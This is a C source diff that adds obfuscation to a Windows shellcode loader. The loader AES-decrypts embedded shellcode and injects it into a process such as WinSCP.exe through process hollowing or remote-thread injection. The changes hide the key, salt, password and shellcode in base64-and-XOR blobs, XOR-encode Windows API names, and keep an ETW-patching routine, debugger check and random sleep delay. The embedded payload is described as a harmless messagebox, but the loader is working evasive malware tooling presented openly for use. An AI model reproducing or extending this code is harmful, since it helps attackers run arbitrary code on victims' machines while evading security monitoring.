@@ -12,73 +12,96 @@
 // Crypt parameters
 #define AES_KEY_SIZE 32  // 256 bits for AES-256
 #define AES_BLOCK_SIZE 16
+#define XR_KSIZE 16
 
-// CHANGE THIS
-#define ORIGINAL_SHELLCODE_LENGTH 244
+// ----------- BEGIN CHANGE THIS BLOCK ---------------
+// Also check the winapi.h containing XOR key used to encode WinAPI functions during compiling
+#define ORIG_SC_LEN 244
 
-// CHANGE THIS
-const char* processinj = "C:\\windows\\explorer.exe";
+//const char* processinj = "C:\\windows\\explorer.exe";
 //const char* processinj = "C:\\Program Files\\WinSCP\\WinSCP.exe";
+const char* processinj = "C:\\Program Files (x86)\\WinSCP\\WinSCP.exe";
 //const char* processinj = "C:\\windows\\system32\\notepad.exe";
 
-// CHANGE THIS
-unsigned char ivEnc[AES_BLOCK_SIZE] = {
-  "\x79\x10\x94\x0F\x02\x3D\xBC\xEB\x1A\xC1\x0C\xE5\x1B\x00\xD0\xB7"
+/* Global Base64 encoded and XORRED values */
+const char* bxrKey = {
+    "U1NBUmphPzQncnVRZjpdZw=="
 };
-// CHANGE THIS
-unsigned char salt[16] = {
-  "\xDC\x56\x35\x21\x64\x0B\x3C\x7E\x8E\x4B\x13\xE0\x49\x43\x12\x58"
+const char* bxrIv = {
+    "5j1x3gRl9aLzTNH+akpolg=="
 };
-// CHANGE THIS
-unsigned char password[] = {
-    "\x31\x32\x33\x34\x35\x36"
+const char* bxrPwd = {
+    "YmFyZl9X"
 };
-// CHANGE THIS
-// Messagebox showing "HELLOHELLO"
-unsigned char encrypted_shellcode[] =
-{
-"\x2C\x52\x26\x6C\x8D\x1F\xA7\x3B\x28\xC6\x5C\x10\x41\x95\xA0\x61\x0B\x38\xBC\xEC"
-"\x4D\xAC\xCB\xDD\x98\x66\x0D\x9A\x6D\xC9\xA5\x9B\x32\xAB\xA4\x8D\x0C\xCD\xEE\xD7"
-"\x1F\xAA\x5B\xBD\x28\xA0\xDF\x99\x75\xA7\x87\xCD\xF5\xBC\xCF\x21\x3A\xF3\xFA\xA6"
-"\x61\x09\xFE\x5E\x8C\x5A\xC4\x5C\x27\xC1\x54\x3C\xD2\x57\x70\x10\x31\x04\x40\x06"
-"\x99\x1F\x44\x87\x48\x94\xEE\x45\x30\xE0\x5B\xB7\xDE\x4B\xCF\x18\xEF\xC5\x9B\x5B"
-"\x84\x17\x91\x96\xFA\x9D\x80\x19\x90\x0E\x9C\x37\xB0\x96\xBF\xCF\xC4\x10\x98\x88"
-"\x81\x5E\xA0\xA4\x81\x1B\xAC\x5C\x95\x23\xD7\xFD\xA8\x9B\x4C\x4C\x08\x35\x09\x7A"
-"\xBA\x31\xC9\x56\x22\x78\x1A\x8B\x46\xFD\xF9\x64\xA4\xD0\x9D\xA0\x6D\x61\xC9\xB7"
-"\xF3\x6F\x04\xC3\x51\xE0\x59\x3F\x17\x2B\x71\x10\xD4\xC4\x03\xA1\x5F\x16\x6F\xD9"
-"\x22\xB2\x14\x82\x3D\x69\x9D\xFA\x21\x96\x02\xF7\xF4\x0F\x0D\x9D\xB9\xA2\x57\x4B"
-"\x18\x9B\xA7\xE3\x9A\x92\xF0\x55\x3E\xD0\x99\x87\xDA\x17\xDB\xB9\xF1\x3D\x14\x5E"
-"\xE4\xA1\x02\x77\x67\xC3\xD6\x25\xB8\xD0\x71\xE8\x56\xEA\xA4\xF8\xE5\x98\x57\xDD"
-"\x41\x59\xC7\x63\x9B\xF9\xC6\x95\xD3\x7D\x2E\xF5\x30\x76\x26\x01"
+const char* bxrSlt = {
+    "8qkvu9VNPLvVAzYL0wkWoA=="
 };
+// x86 shellcode Messagebox showing "HELLOHELLO"
+const char* bxrSc = {
+    "Ow964ezZbocWiYzQc0D3gQNLjWGbcB0MXvMGDMDyUUCg5b6WKvTmmvHMvvTycxNcWumQpiqw2kJfBV5h"
+    "1VtOG4tCM5EA6a3Smv43Tsd63RyIcRbD1IpD9qZL7fBv6AHTtAeX6JbeuoMGe9wZklrbQrdpCQnbhKQA"
+    "k2gLR6PK8K7QmNjXVW4PoYvWofElAy6SmivpqPiUt79529OD+PB2x4Mvp8h9JHn64H7rGDHvT1kHY++q"
+    "BxDsHjnYNWJwHxaNg4P2d5CQqpUhKr9E4uE3RfgRYE9y+427vTXrQT0HKHXj3lDm6AKlkBbl5/CSQRwp"
+    "jfu5IwvpoR9fnE/vcSLWSw=="
+};
+// ----------- END CHANGE THIS BLOCK ---------------
 
-unsigned char decrypted_shellcode[ORIGINAL_SHELLCODE_LENGTH];
+// Decrypted shellcode
+unsigned char decr_sc[ORIG_SC_LEN];
 
-/* Output encrypted and decrypted */
+/* XOR key used for decoding encrypted variables */
+unsigned char* xrKey = NULL;
+/* Global decoded vars */
+unsigned char* Key = NULL;
+unsigned char* Iv = NULL;
+unsigned char* Pwd = NULL;
+unsigned char* Slt = NULL;
+unsigned char* Sc = NULL;
+
+/* Functions used during program */
+void dec_vars();
 void prt_dat(const char* title, const void* data, int len, int is_oneliner);
 void cp_decr(unsigned char* shell_dec, int lenDecShell, unsigned char* shellcode, int original_len);
 void cp_arr(unsigned char* src, unsigned char* dest, int src_len, int dest_len);
 int decr(unsigned char* ciphertext, int ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* plaintext);
-int find_proc(const char* process_name, int* pid, int* baseaddr);
+int fnd_proc(const char* process_name, int* pid, int* baseaddr);
 void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len);
 void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int targetPid);
-int dis_ET(HANDLE hProcess);
-void delay_ex();
+int dis_et(HANDLE hProcess);
+void del_ex();
+void xr(char* str, size_t len);
+unsigned char* b64_dec(const char* input, int* output_length);
+char* xr_dec(const unsigned char* data, size_t len);
 
 int main(int argc, char** argv)
 {
     // Variables
     int lenBits = AES_KEY_SIZE * 8;  // AES-256 (256 bits)
-    int lenShell = ORIGINAL_SHELLCODE_LENGTH;  // Using the predefined length of original shellcode
+    int lenShell = ORIG_SC_LEN;  // Using the predefined length of original shellcode
     unsigned char derivedKey[AES_KEY_SIZE + AES_BLOCK_SIZE];  // Key and IV (256-bit key + 128-bit IV)
     int pid = 0;
     int baseaddr = 0;
 
+    // Base64 and XOR decode shellcode related variables
+    // Includes un'XORRING Windows API functions
+    dec_vars();
+
+    // DEBUG PRINTING
+    printf("Decoded XOR key: %s\n", xrKey);
+    printf("Decoded password: %s\n", Pwd);
+    size_t lenSlt = strlen((char*)Slt);
+    prt_dat("Decoded salt", Slt, lenSlt, 1);
+    size_t lenIv = strlen((char*)Iv);
+    prt_dat("Decoded IV", Iv, lenIv, 1);
+    size_t lenSc = strlen((char*)Sc);
+    prt_dat("Decoded shellcode", Sc, 280, 0);
+
     // Disable OpenSSL to load default config
     OPENSSL_config(NULL);
 
-    // Derive key and IV using PBKDF2 from the hardcoded password and salt
-    if (!PKCS5_PBKDF2_HMAC_SHA1((char*)password, strlen((char*)password), salt, sizeof(salt), 10000, sizeof(derivedKey), derivedKey)) {
+    // Derive key and IV using PBKDF2 from the hardcoded pswd and salt
+    //if (!PKCS5_PBKDF2_HMAC_SHA1((char*)pswd, strlen((char*)pswd), salt, sizeof(salt), 10000, sizeof(derivedKey), derivedKey)) {
+    if (!PKCS5_PBKDF2_HMAC_SHA1(Pwd, strlen((char*)Pwd), Slt, lenSlt, 10000, sizeof(derivedKey), derivedKey)) {
         fprintf(stderr, "Error deriving key and IV with PBKDF2\n");
         exit(-1);
     }
@@ -96,7 +119,8 @@ int main(int argc, char** argv)
     memset(shell_dec, 0, lenDec);  // Padding the encrypted data buffer
 
     // Decrypt the shellcode
-    int lenDecShell = decr(encrypted_shellcode, lenDec, aesKey, ivDec, shell_dec);
+    //int lenDecShell = decr(encr_sc, lenDec, aesKey, ivDec, shell_dec);
+    int lenDecShell = decr(Sc, lenDec, aesKey, ivDec, shell_dec);
     if (lenDecShell == 0) {
         fprintf(stderr, "Error finalizing AES decryption\n");
         free(shell_dec);
@@ -104,13 +128,13 @@ int main(int argc, char** argv)
     }
 
     // Fill the shellcode with the repeated decrypted content
-    cp_arr(shell_dec, decrypted_shellcode, lenShell, sizeof(decrypted_shellcode));
+    cp_arr(shell_dec, decr_sc, lenShell, sizeof(decr_sc));
 
     // Print the decrypted shellcode
-    prt_dat("\nDECRYPTED SHELLCODE", decrypted_shellcode, lenShell, 1);
+    prt_dat("\nDECRYPTED SHELLCODE", decr_sc, lenShell, 1);
 
     // Find the process ID of explorer.exe (or any other process like svchost.exe)
-    find_proc(processinj,&pid,&baseaddr);
+    fnd_proc(processinj,&pid,&baseaddr);
 
     // Check PID and inject decrypted shellcode into process
     if (pid != 0) {
@@ -118,13 +142,13 @@ int main(int argc, char** argv)
         //delay_ex();
 
         // DEFUNCT; Disable ETW
-        //dis_ET(pid);
+        //dis_et(pid);
 
         // Inject shellcode into process
-        //inj_sc(pid, decrypted_shellcode, sizeof(decrypted_shellcode));
+        //inj_sc(pid, decr_sc, sizeof(decr_sc));
 
         // Inject shellcode into process using process hollowing
-        proc_hol(decrypted_shellcode, sizeof(decrypted_shellcode), baseaddr, pid);
+        proc_hol(decr_sc, sizeof(decr_sc), baseaddr, pid);
     }
     else {
         fprintf(stderr, "Failed to find the process %s\n", processinj);
@@ -203,13 +227,13 @@ void* lookup_func(const char* moduleName, const char* functionName) {
     return funcAddress;
 }
 
-int find_proc(const char* process_name, int* pid, int* baseaddr) {
+int fnd_proc(const char* process_name, int* pid, int* baseaddr) {
     DWORD processes[1024], cbNeeded, cProcesses;
 
     printf("\nFinding process ID and base address based on name %s ...\n", process_name);
 
     // Enumerate all processes
-    pEnumProcesses NtEnumProcesses = (pEnumProcesses)lookup_func("psapi.dll", "EnumProcesses");
+    pEnumProcesses NtEnumProcesses = (pEnumProcesses)lookup_func(papdl, pEnProc);
     if(!NtEnumProcesses(processes, sizeof(processes), &cbNeeded)) {
         fprintf(stderr, "EnumProcesses failed\n");
         return 0;
@@ -221,10 +245,10 @@ int find_proc(const char* process_name, int* pid, int* baseaddr) {
     for (unsigned int i = 0; i < cProcesses; i++) {
         if (processes[i] == 0) continue;
         // Get the address of OpenProcess dynamically
-        pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func("kernel32.dll", "OpenProcess");
-        pEnumProcessModules NtEnumProcessModules = (pEnumProcessModules)lookup_func("psapi.dll", "EnumProcessModules");
-        pGetModuleFileNameExA NtGetModuleFileNameExA = (pGetModuleFileNameExA)lookup_func("psapi.dll", "GetModuleFileNameExA");
-        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
+        pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func(k32dl, kOpProc);
+        pEnumProcessModules NtEnumProcessModules = (pEnumProcessModules)lookup_func(papdl, pEnProcMod);
+        pGetModuleFileNameExA NtGetModuleFileNameExA = (pGetModuleFileNameExA)lookup_func(papdl, pGModFname);
+        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
 
         // Open the process with sufficient access rights only if it's a potential match
         HANDLE hProcess = NtOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
@@ -241,7 +265,7 @@ int find_proc(const char* process_name, int* pid, int* baseaddr) {
                         if (_stricmp(filename, process_name) == 0) {
                             *pid = (int)processes[i];
                             *baseaddr = (int)hMods[j];
-                            printf("Found matching process: %d (%s)\nBase address: %d\n\n", *pid, filename, *baseaddr);
+                            printf("Found matching process: %d (%s)\nBase address: %x\n\n", *pid, filename, *baseaddr);
                             NtCloseHandle(hProcess);
                             return 1;
                         }
@@ -256,8 +280,8 @@ int find_proc(const char* process_name, int* pid, int* baseaddr) {
 
 void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len) {
     // Get the address of OpenProcess dynamically
-    pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func("kernel32.dll", "OpenProcess");
-    pGetLastError NtGetLastError = (pGetLastError)lookup_func("kernel32.dll", "GetLastError");
+    pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func(k32dl, kOpProc);
+    pGetLastError NtGetLastError = (pGetLastError)lookup_func(k32dl, kGLErr);
 
     // Open the target process with appropriate access
     HANDLE hProcess = NtOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
@@ -267,48 +291,48 @@ void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len) {
     }
 
     // Get address
-    pVirtualAllocEx NtVirtualAllocEx = (pVirtualAllocEx)lookup_func("kernel32.dll", "VirtualAllocEx");
+    pVirtualAllocEx NtVirtualAllocEx = (pVirtualAllocEx)lookup_func(k32dl, kVAlEx);
 
     // Allocate memory in the target process to store the shellcode
     LPVOID remoteMemory = NtVirtualAllocEx(hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteMemory) {
         fprintf(stderr, "Failed to allocate memory in target process\n");
-        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
+        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
         NtCloseHandle(hProcess);
         return;
     }
 
     // Write the shellcode to the allocated memory
-    pWriteProcessMemory NtWriteProcessMemory = (pWriteProcessMemory)lookup_func("kernel32.dll", "WriteProcessMemory");
+    pWriteProcessMemory NtWriteProcessMemory = (pWriteProcessMemory)lookup_func(k32dl, kWpm);
     if (!NtWriteProcessMemory(hProcess, remoteMemory, shellcode, shellcode_len, NULL)) {
         fprintf(stderr, "Failed to write shellcode to process memory\n");
-        pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func("kernel32.dll", "VirtualFreeEx");
+        pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func(k32dl, kVFrEx);
         NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
-        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
+        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
         NtCloseHandle(hProcess);
         return;
     }
 
     // Create a remote thread to execute the shellcode
-    pCreateRemoteThread NtCreateRemoteThread = (pCreateRemoteThread)lookup_func("kernel32.dll", "CreateRemoteThread");
+    pCreateRemoteThread NtCreateRemoteThread = (pCreateRemoteThread)lookup_func(k32dl, kCrRemThr);
     HANDLE hThread = NtCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
     if (!hThread) {
         fprintf(stderr, "Failed to create remote thread - Error: %lu\n", NtGetLastError());
-        pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func("kernel32.dll", "VirtualFreeEx");
+        pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func(k32dl, kVFrEx);
         NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
-        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
+        pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
         NtCloseHandle(hProcess);
         return;
     }
 
     // Wait for the thread to finish execution (optional)
-    pWaitForSingleObject NtWaitForSingleObject = (pWaitForSingleObject)lookup_func("kernel32.dll", "WaitForSingleObject");
+    pWaitForSingleObject NtWaitForSingleObject = (pWaitForSingleObject)lookup_func(k32dl, kWSingObj);
     NtWaitForSingleObject(hThread, INFINITE);
 
     // Clean up: Close the thread handle and free the allocated memory
-    pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
+    pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
     NtCloseHandle(hThread);
-    pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func("kernel32.dll", "VirtualFreeEx");
+    pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func(k32dl, kVFrEx);
     NtVirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
     NtCloseHandle(hProcess);
 
@@ -317,19 +341,19 @@ void inj_sc(DWORD pid, unsigned char* shellcode, int shellcode_len) {
 // DEFUNCT
 void proc_hol(unsigned char* shellcode, int shellcode_len, int baseaddr, int targetPid)
 {
-    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)lookup_func("ntdll.dll", "NtQueryInformationProcess");
-    pCreateProcessA NtCreateProcessA = (pCreateProcessA)lookup_func("kernel32.dll", "CreateProcessA");
-    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)lookup_func("ntdll.dll", "NtUnmapViewOfSection");
-    pGetLastError NtGetLastError = (pGetLastError)lookup_func("kernel32.dll", "GetLastError");
-    pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func("kernel32.dll", "CloseHandle");
-    pTerminateProcess NtTerminateProcess = (pTerminateProcess)lookup_func("kernel32.dll", "TerminateProcess");
-    pVirtualAllocEx NtVirtualAllocEx = (pVirtualAllocEx)lookup_func("kernel32.dll", "VirtualAllocEx");
-    pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func("kernel32.dll", "VirtualFreeEx");
-    pWriteProcessMemory NtWriteProcessMemory = (pWriteProcessMemory)lookup_func("kernel32.dll", "WriteProcessMemory");
-    pWaitForSingleObject NtWaitForSingleObject = (pWaitForSingleObject)lookup_func("kernel32.dll", "WaitForSingleObject");
-    pCreateRemoteThread NtCreateRemoteThread = (pCreateRemoteThread)lookup_func("kernel32.dll", "CreateRemoteThread");
-    pResumeThread NtResumeThread = (pResumeThread)lookup_func("kernel32.dll", "ResumeThread");
-    pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func("kernel32.dll", "OpenProcess");
+    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)lookup_func(ntdl, nNqip);
+    pCreateProcessA NtCreateProcessA = (pCreateProcessA)lookup_func(k32dl, kCrPrA);
+    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)lookup_func(ntdl, nUnMvs);
+    pGetLastError NtGetLastError = (pGetLastError)lookup_func(k32dl, kGLErr);
+    pCloseHandle NtCloseHandle = (pCloseHandle)lookup_func(k32dl, kChand);
+    pTerminateProcess NtTerminateProcess = (pTerminateProcess)lookup_func(k32dl, kTermPr);
+    pVirtualAllocEx NtVirtualAllocEx = (pVirtualAllocEx)lookup_func(k32dl, kVAlEx);
+    pVirtualFreeEx NtVirtualFreeEx = (pVirtualFreeEx)lookup_func(k32dl, kVFrEx);
+    pWriteProcessMemory NtWriteProcessMemory = (pWriteProcessMemory)lookup_func(k32dl, kWpm);
+    pWaitForSingleObject NtWaitForSingleObject = (pWaitForSingleObject)lookup_func(k32dl, kWSingObj);
+    pCreateRemoteThread NtCreateRemoteThread = (pCreateRemoteThread)lookup_func(k32dl, kCrRemThr);
+    pResumeThread NtResumeThread = (pResumeThread)lookup_func(k32dl, kResThr);
+    pOpenProcess NtOpenProcess = (pOpenProcess)lookup_func(k32dl, kOpProc);
 
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
@@ -463,20 +487,20 @@ int decr(unsigned char* ciphertext, int ciphertext_len, unsigned char* key, unsi
 }
 
 int dbg_pres() {
-    pIsDebuggerPresent NtIsDebuggerPresent = (pIsDebuggerPresent)lookup_func("kernel32.dll", "IsDebuggerPresent");
+    pIsDebuggerPresent NtIsDebuggerPresent = (pIsDebuggerPresent)lookup_func(k32dl, kDbgPres);
     return NtIsDebuggerPresent();
 }
 
 // Function to disable ETW in the target process
-int dis_ET(HANDLE hProcess) {
+int dis_et(HANDLE hProcess) {
     // The patch to disable ETW: xor rax, rax; ret
     unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };
 
     // Lookup function pointers for the required Windows APIs
-    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)lookup_func("ntdll.dll", "NtProtectVirtualMemory");
-    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)lookup_func("ntdll.dll", "NtWriteVirtualMemory");
-    pFlushInstrucionCache NtFlushInstructionCache = (pFlushInstrucionCache)lookup_func("kernel32.dll", "FlushInstructionCache");
-    pEventWrite NtEventWrite = (pEventWrite)lookup_func("advapi32.dll", "EventWrite");
+    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)lookup_func(ntdl, nProcVmem );
+    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)lookup_func(ntdl, nWrVMem );
+    pFlushInstrucionCache NtFlushInstructionCache = (pFlushInstrucionCache)lookup_func(k32dl, kFlInstrC);
+    pEventWrite NtEventWrite = (pEventWrite)lookup_func(adv32dl, aEvtWr);
 
     // Validate function pointers
     if (!NtProtectVirtualMemory || !NtWriteVirtualMemory || !NtFlushInstructionCache) {
@@ -524,8 +548,112 @@ int dis_ET(HANDLE hProcess) {
     return 1;
 }
 
-void delay_ex() {
+void del_ex() {
     srand(time(NULL));
     int delay = rand() % 30000 + 10000; // Random delay between 10 and 30 seconds
     Sleep(delay);
+}
+
+// Function to XOR function strings
+void xr(char* str, size_t len) {
+    for (size_t i = 0; i < len; i++) {
+        str[i] ^= XKY;
+    }
+}
+
+// XOR function for shellcode related hardcoded values
+unsigned char* xr_dec(const unsigned char* data, size_t len) {
+    unsigned char* xordata = (unsigned char*)malloc(len + 1); // +1 for null termination if string
+    if (xordata == NULL) {
+        fprintf(stderr, "[!] Error allocating memory for XOR result\n");
+        exit(-1);
+    }
+
+    for (size_t i = 0; i < len; i++) {
+        xordata[i] = data[i] ^ xrKey[i % XR_KSIZE];
+    }
+
+    xordata[len] = '\0'; // Null-terminate if working with strings
+    return (char*)xordata;
+}
+
+// Base64 decode function
+unsigned char* b64_dec(const char* input, int* output_length) {
+    int input_length = strlen(input);
+    int max_output_length = (input_length * 3) / 4; // Estimate output size
+    unsigned char* output = (unsigned char*)malloc(max_output_length + 1); // +1 for null terminator
+    if (!output) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return NULL;
+    }
+
+    int len = EVP_DecodeBlock(output, (const unsigned char*)input, input_length);
+    if (len < 0) {
+        fprintf(stderr, "Base64 decoding failed\n");
+        free(output);
+        return NULL;
+    }
+
+    // OpenSSL's EVP_DecodeBlock may include padding characters in the output
+    while (len > 0 && output[len - 1] == '\0') {
+        len--;
+    }
+
+    output[len] = '\0'; // Null-terminate the output
+    *output_length = len;
+
+    return output;
+}
+
+// Decode variables used in program
+void dec_vars() {
+    int xrLen;
+    int ivLen;
+    int sltLen;
+    int pwdLen;
+    int scLen = 244;
+
+    // B64 decode main XOR key
+    xrKey = b64_dec(bxrKey, &xrLen);
+
+    // B64 and XOR decode IV
+    unsigned char* xrIV = b64_dec(bxrIv, &ivLen);
+    Iv = xr_dec(xrIV, ivLen);
+    // B64 and XOR decode salt
+    unsigned char* xrSlt = b64_dec(bxrSlt, &sltLen);
+    Slt = xr_dec(xrSlt, sltLen);
+    // B64 and XOR decode password
+    unsigned char* xrPwd = b64_dec(bxrPwd, &pwdLen);
+    Pwd = xr_dec(xrPwd, pwdLen);
+    // B64 and XOR decode shellcode
+    unsigned char* xrSc = b64_dec(bxrSc, &scLen);
+    Sc = xr_dec(xrSc, scLen);
+
+    /* XOR decode function strings */
+    // DLL's
+    xr(papdl, strlen(papdl));
+    xr(k32dl, strlen(k32dl));
+    xr(ntdl, strlen(ntdl));
+    // Functions
+    xr(pEnProc, strlen(pEnProc));
+    xr(kOpProc, strlen(kOpProc));
+    xr(pEnProcMod, strlen(pEnProcMod));
+    xr(pGModFname, strlen(pGModFname));
+    xr(kChand, strlen(kChand));
+    xr(kGLErr, strlen(kGLErr));
+    xr(kVAlEx, strlen(kVAlEx));
+    xr(kWpm, strlen(kWpm));
+    xr(kVFrEx, strlen(kVFrEx));
+    xr(kCrRemThr, strlen(kCrRemThr));
+    xr(kWSingObj, strlen(kWSingObj));
+    xr(nNqip, strlen(nNqip));
+    xr(kCrPrA, strlen(kCrPrA));
+    xr(nUnMvs, strlen(nUnMvs));
+    xr(kTermPr, strlen(kTermPr));
+    xr(kResThr, strlen(kResThr));
+    xr(kDbgPres, strlen(kDbgPres));
+    xr(nProcVmem, strlen(nProcVmem));
+    xr(nWrVMem, strlen(nWrVMem));
+    xr(kFlInstrC, strlen(kFlInstrC));
+    xr(aEvtWr, strlen(aEvtWr));
 }
